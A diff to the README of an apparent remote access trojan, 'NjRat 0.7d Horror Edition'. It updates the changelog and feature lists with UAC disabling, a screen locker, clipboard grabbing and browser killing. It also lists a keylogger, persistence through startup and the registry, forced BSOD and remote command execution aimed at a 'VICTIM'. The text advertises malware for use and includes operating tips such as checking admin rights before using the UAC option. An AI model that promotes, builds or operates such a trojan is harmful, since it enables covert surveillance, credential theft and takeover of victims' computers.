@@ -7,11 +7,10 @@
 ### https://streamja.com/5qk50
 ##
 
-.:: NEWEST FEATURES: added screen locker (lock and unlock, invicible to taskmgr and alt + f4), grab clipbord (plugin based, might not work proper in slow connection), kill browsers (in anti's), screamer have loud sound effect(caful in testing, turn volume down)
+.:: NEWEST FEATURES: added disable UAC for admin stub purpsoes
 
 .:: NOTE: Do not use UAC if you are already admin privileges or the payload will not execute, use Check Admin first!!
 
-.:: NOTE: Do not use Admin require stub with startup unless you disabled UAC, it will request admin in startup! i later will possibly add disable uac for Admin stub.
 
 ![Screenshot](https://github.com/De-eloper/NjRat-0.7d-Horror-Edition/raw/main/Screenshot_.PNG?raw=true)
 
@@ -36,6 +35,7 @@ Use Admin Rights +
 Copy to direcroy + 
 Keylogger + 
 Icon Changer +
+Disable UAC +
 BSOD on kill + 
 Copy startup + 
 Registry  startup + 
@@ -51,7 +51,10 @@ VICTIM:
 Check if Admin +
 UAC Prompt +
 Managers file + 
+Screen Locker +
+Browser Anti +
 process Mnager + 
+Clipboard Grab +
 Connections + 
 Registry + 
 Remote CMD + 
